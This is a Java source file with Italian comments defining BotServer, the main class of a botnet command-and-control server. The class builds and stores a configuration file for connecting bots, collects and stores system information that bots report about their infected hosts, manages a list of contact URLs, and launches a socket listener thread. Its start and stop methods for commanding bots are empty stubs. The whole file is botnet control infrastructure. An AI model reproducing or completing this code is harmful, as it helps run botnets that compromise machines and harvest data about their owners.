package control.server;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import control.Config;
import control.Utility;
import control.client.ContactThread;
import control.client.Log;
import model.BotStatus;
import model.SortMode;
import model.SystemInfo;
import model.SystemInfoEntry;
import model.URLEntry;
import model.gui.SystemInfoEntryProperty;
import model.gui.URLEntryProperty;

/**
 * La classe BotServer è la classe principale del serverC&C. Il suo compito è quello di 
 * creare il file di configurazione, che invierà ai bot che si collegano alla botnet.
 * Inolltre colleziona le informazioni di sistema ricevute dagli stessi bot *
 */
public class BotServer {
	String botServerId;
	BotStatus status;
	SocketBotServerThread socketBotServerThread;
	Config config;
	Log log;
	ProgramLog programLog;
	
	SystemInfoBotServer systemInfoBotServer;

	ArrayList<ContactThread> contactThreadList;

	Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, botServerDirPath;		

	public BotServer() {
		botServerId = Utility.generateID(SortMode.ASCENDING);
		status = BotStatus.IDLE;
	}
	
	public String getBotServerId() {
		return botServerId;
	}
	
	public void setBotServerId(String id) {
		this.botServerId = id;
	}
	
	public BotStatus getStatus() {
		return status;
	}
	
	public void setStatus(BotStatus status) {
		this.status = status;
	}
	
	public ArrayList<URLEntry> getContactsList() {
		return config.getContactsList();
	}
	
	public void setContactsList(ArrayList<URLEntry> contactsList) {
		config.setContactsList(contactsList);
	}
	
	public Config getConfig() {
		return config;
	}
	
	public ArrayList<SystemInfoEntryProperty> getSystemInfoProperty(int selectedIndex) {
		return systemInfoBotServer.getSystemInfoProperty(selectedIndex);
	}
	
	public ArrayList<URLEntry> getContactList(){
		return config.getContactsList();
	};
	
	public ArrayList<URLEntryProperty> getContactsListProperty() {
		ArrayList<URLEntryProperty> returnValue = new ArrayList<URLEntryProperty>();
		
		for (int i = 0; i < config.getContactsList().size(); i++) {
			returnValue.add(new URLEntryProperty(config.getContactsList().get(i)));
		}

		return returnValue;
	}
	
	/**
	 * Inizializzazione del serverC&C
	 */
	public void init() {

		initPaths();

		config = new Config(configFilePath);
		log = new Log(logFilePath);
		programLog = ProgramLog.getProgramLog();
		systemInfoBotServer = new SystemInfoBotServer(sysInfoFilePath);
		
		config.readFile();
		
		log.openOrCreateLogFile();
		programLog.addInfo("Program Started");

		systemInfoBotServer.openOrCreateSystemInfoFile();
		systemInfoBotServer.readFile();
		
		socketBotServerThread = new SocketBotServerThread();
		Thread t = new Thread(socketBotServerThread);
		t.start();
	}

	private void initPaths() {
		prjDirPath = Paths.get(System.getProperty("user.dir"));
		dataDirPath = prjDirPath.resolve("data");
		botServerDirPath = dataDirPath.resolve("botmaster");
		configFilePath = botServerDirPath.resolve("config.txt");
		logFilePath = botServerDirPath.resolve("log.txt");
		sysInfoFilePath = botServerDirPath.resolve("sysinfo.txt");
	}

	/**
	 * Operazioni da svolgere alla chiusura dell'applicazione
	 * come la scrittura dei file e l'interruzione dei thread
	 */
	public void close() {
		systemInfoBotServer.writeFile();
		socketBotServerThread.interrupt();
		config.writeFile();
	}

	public void start() {
 		/*il server invia il comando di start ai bot*/
	}

	public void stop() {
		/*il server invia il comando di stop ai bot*/
	}
	
	/**
	 * Aggiunge o aggiorna un blocco di informazioni relative ad un host 
	 * rispettivamente nel caso il cui il bot sia nuovo oppure già presente nella 
	 * botnet 
	 */
	public void addSystemInfo(ArrayList<SystemInfoEntry> inSystemInfo) {
		systemInfoBotServer.addOrReplaceSystemInfo(new SystemInfo(inSystemInfo));
		
	}
	
	/**
	 * Aggiunge un contatto alla lista dei contatti
	 */
	public URLEntry addContact(URLEntry newUrlEntry) {
		int lastContactId = 0;
		if(!config.getContactsList().isEmpty()){
			lastContactId = config.getContactsList().get(config.getContactsList().size()-1).getID();
		}
		newUrlEntry.setID(lastContactId+1);
		config.getContactsList().add(newUrlEntry);
		return newUrlEntry;
	}

	/**
	 * Rimuove un contatto presente nella lista dei contatti
	 */
	public void removeContact(Integer id) {
		for (int i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID().equals(id)){
				config.getContactsList().remove(i);
			}
		}
	}

	/**
	 * Modifica un contatto presente nella lista dei contatti
	 */
	public void editContact(URLEntry newUrlEntry) {
		int i;
		for (i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID()==newUrlEntry.getID()){
				break;
			}
		}
		config.getContactsList().set(i, newUrlEntry);
	}
}
